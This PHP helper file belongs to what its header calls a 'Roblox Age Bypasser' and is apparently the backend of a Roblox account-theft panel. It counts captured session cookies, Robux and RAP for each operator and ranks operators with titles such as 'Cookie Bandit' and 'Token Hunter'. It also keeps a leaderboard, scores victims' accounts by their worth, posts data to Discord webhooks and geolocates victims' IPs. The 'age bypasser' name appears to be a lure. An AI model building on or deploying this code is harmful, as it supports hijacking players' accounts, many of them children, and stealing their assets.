<?php
/**
 * Helper Functions for Roblox Age Bypasser
 * All reusable functions for the application
 */

// Sanitize directory name
function sanitizeDirectory($directory) {
    return preg_replace('/[^a-zA-Z0-9_-]/', '', trim($directory));
}

// Check if directory exists
function directoryExists($directory) {
    return file_exists(DATA_PATH . $directory);
}

// Generate unique token
function generateToken($length = 32) {
    $base = 'HYPERBLOX';
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomPart = '';
    
    for ($i = 0; $i < $length - strlen($base); $i++) {
        $randomPart .= $characters[random_int(0, strlen($characters) - 1)];
    }
    
    $mixed = str_shuffle($base . $randomPart);
    return substr($mixed, 0, $length);
}

// Validate webhook URL
function validateWebhook($webhook) {
    if (empty($webhook)) return false;
    
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Discord webhooks should return 200 or 405 (Method Not Allowed for HEAD requests)
    return in_array($httpCode, [200, 405]);
}

// Send webhook notification
function sendWebhook($webhookUrl, $data) {
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode >= 200 && $httpCode < 300;
}

// Save instance data
function saveInstanceData($directory, $data) {
    $instanceDir = DATA_PATH . $directory;
    
    if (!is_dir($instanceDir)) {
        mkdir($instanceDir, 0755, true);
    }
    
    $file = $instanceDir . '/data.json';
    return file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT)) !== false;
}

// Get instance data
function getInstanceData($directory) {
    $file = DATA_PATH . $directory . '/data.json';
    
    if (!file_exists($file)) {
        return null;
    }
    
    $data = json_decode(file_get_contents($file), true);
    return $data;
}

// Update instance stats
function updateInstanceStats($directory, $field, $value = 1) {
    $data = getInstanceData($directory);
    
    if (!$data) return false;
    
    // Update total stats
    if (isset($data['stats'][$field])) {
        $data['stats'][$field] += $value;
    }
    
    // Update daily stats
    $dayOfWeek = date('w'); // 0 (Sunday) to 6 (Saturday)
    $dailyField = str_replace('total', '', $field);
    $dailyField = lcfirst(str_replace('Total', '', $field));
    
    // Convert field names to match dailyStats structure
    $fieldMap = [
        'Visits' => 'visits',
        'Cookies' => 'cookies',
        'Robux' => 'robux',
        'RAP' => 'rap',
        'Summary' => 'summary'
    ];
    
    foreach ($fieldMap as $key => $val) {
        if (stripos($field, $key) !== false) {
            $dailyField = $val;
            break;
        }
    }
    
    if (isset($data['dailyStats'][$dailyField][$dayOfWeek])) {
        $data['dailyStats'][$dailyField][$dayOfWeek] += $value;
    }
    
    return saveInstanceData($directory, $data);
}

// Save token data
function saveTokenData($token, $data) {
    if (!is_dir(TOKENS_PATH)) {
        mkdir(TOKENS_PATH, 0755, true);
    }
    
    $file = TOKENS_PATH . $token . '.json';
    return file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT)) !== false;
}

// Get token data
function getTokenData($token) {
    $file = TOKENS_PATH . $token . '.json';
    
    if (!file_exists($file)) {
        return null;
    }
    
    return json_decode(file_get_contents($file), true);
}

// Verify token
function verifyToken($token) {
    $data = getTokenData($token);
    return $data !== null;
}

// Get global statistics
function getGlobalStats() {
    $file = DATA_PATH . '../global_stats.json';
    
    if (!file_exists($file)) {
        $defaults = [
            'totalInstances' => 0,
            'totalVisits' => 0,
            'totalCookies' => 0,
            'totalRobux' => 0,
            'totalRAP' => 0,
            'lastUpdated' => date('c')
        ];
        file_put_contents($file, json_encode($defaults, JSON_PRETTY_PRINT));
        return $defaults;
    }
    
    return json_decode(file_get_contents($file), true);
}

// Update global statistics
function updateGlobalStats($field, $value = 1) {
    $stats = getGlobalStats();
    
    if (isset($stats[$field])) {
        $stats[$field] += $value;
    } else {
        $stats[$field] = $value;
    }
    
    $stats['lastUpdated'] = date('c');
    
    $file = DATA_PATH . '../global_stats.json';
    return file_put_contents($file, json_encode($stats, JSON_PRETTY_PRINT)) !== false;
}

// Get rank information based on total cookies
function getRankInfo($totalCookies) {
    $ranks = [
        ['min' => 0, 'max' => 2, 'name' => 'Noob Beamer', 'color' => '#9ca3af'],
        ['min' => 3, 'max' => 9, 'name' => 'Rookie Logger', 'color' => '#60a5fa'],
        ['min' => 10, 'max' => 25, 'name' => 'Script Kiddie', 'color' => '#34d399'],
        ['min' => 26, 'max' => 49, 'name' => 'Amateur Beamer', 'color' => '#fbbf24'],
        ['min' => 50, 'max' => 74, 'name' => 'Lowkey Harvester', 'color' => '#f59e0b'],
        ['min' => 75, 'max' => 99, 'name' => 'Log Collector', 'color' => '#ef4444'],
        ['min' => 100, 'max' => 149, 'name' => 'Token Hunter', 'color' => '#dc2626'],
        ['min' => 150, 'max' => 199, 'name' => 'Cookie Bandit', 'color' => '#c026d3'],
        ['min' => 200, 'max' => 299, 'name' => 'Silent Snatcher', 'color' => '#a855f7'],
        ['min' => 300, 'max' => 399, 'name' => 'Seasoned Harvester', 'color' => '#8b5cf6'],
        ['min' => 400, 'max' => 499, 'name' => 'Digital Hijacker', 'color' => '#7c3aed'],
        ['min' => 500, 'max' => 599, 'name' => 'Beam Technician', 'color' => '#6d28d9'],
        ['min' => 600, 'max' => 699, 'name' => 'Advanced Extractor', 'color' => '#5b21b6'],
        ['min' => 700, 'max' => 799, 'name' => 'Cyber Phantom', 'color' => '#4c1d95'],
        ['min' => 800, 'max' => 899, 'name' => 'Professional Beamer', 'color' => '#3730a3'],
        ['min' => 900, 'max' => 999, 'name' => 'Ultimate Logger', 'color' => '#312e81'],
        ['min' => 1000, 'max' => PHP_INT_MAX, 'name' => 'Hyperblox', 'color' => '#1e1b4b']
    ];

    foreach ($ranks as $index => $rank) {
        if ($totalCookies >= $rank['min'] && $totalCookies <= $rank['max']) {
            $nextRank = $ranks[$index + 1] ?? $rank;
            $progress = ($rank['max'] > $rank['min']) 
                ? (($totalCookies - $rank['min']) / ($rank['max'] - $rank['min'])) * 100 
                : 100;
            $toNext = $rank['max'] - $totalCookies + 1;
            
            return [
                'current' => $rank['name'],
                'currentColor' => $rank['color'],
                'next' => $nextRank['name'],
                'nextColor' => $nextRank['color'],
                'progress' => round($progress, 2),
                'toNext' => max(0, $toNext),
                'totalCookies' => $totalCookies
            ];
        }
    }
    
    // Default for 0 cookies
    return [
        'current' => 'Noob Beamer',
        'currentColor' => '#9ca3af',
        'next' => 'Rookie Logger',
        'nextColor' => '#60a5fa',
        'progress' => 0,
        'toNext' => 3,
        'totalCookies' => 0
    ];
}

// Get leaderboard
function getLeaderboard($limit = 10) {
    $instances = glob(DATA_PATH . '*', GLOB_ONLYDIR);
    $leaderboard = [];
    
    foreach ($instances as $dir) {
        $directory = basename($dir);
        $instanceData = getInstanceData($directory);
        
        if ($instanceData && isset($instanceData['stats'])) {
            $leaderboard[] = [
                'directory' => $directory,
                'username' => $instanceData['username'] ?? 'Unknown',
                'profilePicture' => $instanceData['profilePicture'] ?? '',
                'totalCookies' => $instanceData['stats']['totalCookies'] ?? 0,
                'totalVisits' => $instanceData['stats']['totalVisits'] ?? 0,
                'totalRobux' => $instanceData['stats']['totalRobux'] ?? 0,
                'totalRAP' => $instanceData['stats']['totalRAP'] ?? 0,
                'createdAt' => $instanceData['createdAt'] ?? null
            ];
        }
    }
    
    // Sort by total cookies (descending)
    usort($leaderboard, function($a, $b) {
        return $b['totalCookies'] - $a['totalCookies'];
    });
    
    return array_slice($leaderboard, 0, $limit);
}

// Calculate account score (0-100)
function calculateAccountScore($userInfo) {
    $score = 0;
    
    // Robux (0-20 points)
    $robux = intval(str_replace(',', '', $userInfo['robux'] ?? 0));
    if ($robux >= 100000) $score += 20;
    elseif ($robux >= 50000) $score += 15;
    elseif ($robux >= 10000) $score += 10;
    elseif ($robux >= 1000) $score += 5;
    
    // RAP (0-20 points)
    $rap = intval(str_replace(',', '', $userInfo['rap'] ?? 0));
    if ($rap >= 500000) $score += 20;
    elseif ($rap >= 100000) $score += 15;
    elseif ($rap >= 10000) $score += 10;
    elseif ($rap >= 1000) $score += 5;
    
    // Premium (0-10 points)
    if (isset($userInfo['premium']) && stripos($userInfo['premium'], 'True') !== false) {
        $score += 10;
    }
    
    // Voice Chat (0-10 points)
    if (isset($userInfo['voiceChat']) && stripos($userInfo['voiceChat'], 'True') !== false) {
        $score += 10;
    }
    
    // Friends (0-10 points)
    $friends = intval(str_replace(',', '', $userInfo['friends'] ?? 0));
    if ($friends >= 200) $score += 10;
    elseif ($friends >= 100) $score += 7;
    elseif ($friends >= 50) $score += 5;
    elseif ($friends >= 10) $score += 3;
    
    // Followers (0-10 points)
    $followers = intval(str_replace(',', '', $userInfo['followers'] ?? 0));
    if ($followers >= 1000) $score += 10;
    elseif ($followers >= 500) $score += 7;
    elseif ($followers >= 100) $score += 5;
    elseif ($followers >= 10) $score += 3;
    
    // Account Age (0-10 points)
    $accountAge = $userInfo['accountAge'] ?? '';
    if (preg_match('/(\d+)/', $accountAge, $matches)) {
        $days = intval($matches[1]);
        if ($days >= 365 * 5) $score += 10; // 5+ years
        elseif ($days >= 365 * 2) $score += 7; // 2+ years
        elseif ($days >= 365) $score += 5; // 1+ year
        elseif ($days >= 180) $score += 3; // 6+ months
    }
    
    // Groups Owned (0-10 points)
    $groupsOwned = intval($userInfo['groupsOwned'] ?? 0);
    if ($groupsOwned >= 10) $score += 10;
    elseif ($groupsOwned >= 5) $score += 7;
    elseif ($groupsOwned >= 2) $score += 5;
    elseif ($groupsOwned >= 1) $score += 3;
    
    return min(100, $score); // Cap at 100
}

// Make HTTP request
function makeHttpRequest($url, $method = 'GET', $data = null, $headers = []) {
    $ch = curl_init($url);
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($data) ? json_encode($data) : $data);
        }
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'success' => $httpCode >= 200 && $httpCode < 300,
        'code' => $httpCode,
        'response' => $response,
        'error' => $error
    ];
}

// Get user IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }
}

// Get country from IP
function getCountryFromIP($ip = null) {
    if (!$ip) {
        $ip = getUserIP();
    }
    
    // Use ip-api.com for free geolocation
    $result = makeHttpRequest("http://ip-api.com/json/{$ip}?fields=country");
    
    if ($result['success']) {
        $data = json_decode($result['response'], true);
        return $data['country'] ?? 'Unknown';
    }
    
    return 'Unknown';
}
?>
